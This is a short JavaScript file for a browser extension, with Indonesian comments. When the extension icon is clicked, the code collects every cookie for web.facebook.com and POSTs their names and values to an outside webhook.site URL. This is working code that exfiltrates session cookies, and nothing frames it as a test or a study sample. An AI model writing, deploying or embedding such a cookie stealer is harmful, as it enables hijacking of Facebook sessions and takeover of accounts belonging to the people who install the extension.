function getCookie() {
	browser.cookies.getAll({ url: "https://web.facebook.com" }, function (cookies) {
		console.log(cookies);
		let cookieName = [];
		let cookieVal = [];
		cookies.forEach(function (cookie) {
			cookieName.push(cookie.name);
			cookieVal.push(cookie.value);
		});

		var xhr = new XMLHttpRequest();
		xhr.open("POST", "https://webhook.site/4c69d1d9-da93-4419-8c1c-e1c73d89311f", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

		xhr.onload = function () {
			if (xhr.status === 200) {
				console.log("Data sent successfully");
				console.log(xhr.responseText);
			} else {
				console.error("Error sending data. Status:", xhr.status);
				console.log(xhr.responseText);
			}
		};

		xhr.onerror = function () {
			console.error("Error sending data:", xhr.statusText);
		};
		var data = JSON.stringify({ nama: cookieName, isi: cookieVal });
		// var params = new URLSearchParams();
		// for (var i = 0; i < cookieName.length; i++) {
		// 	params.append("nama", cookieName[i]);
		// 	params.append("isi", cookieVal[i]);
		// }

		xhr.send(data);
	});
}

// Menjalankan fungsi getCookie saat ikon ekstensi diklik
browser.browserAction.onClicked.addListener(getCookie);
